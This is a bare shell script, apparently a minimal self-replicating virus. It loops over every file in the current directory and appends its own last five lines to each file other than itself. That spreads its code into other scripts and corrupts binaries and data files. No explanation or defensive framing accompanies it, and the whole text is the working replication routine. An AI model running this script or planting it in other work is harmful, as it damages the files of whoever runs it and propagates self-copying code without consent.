for k in *;do
	if [ "./$k" != "$0" ]; then
		tail -n 5 $0 | cat >> $k
	fi
done

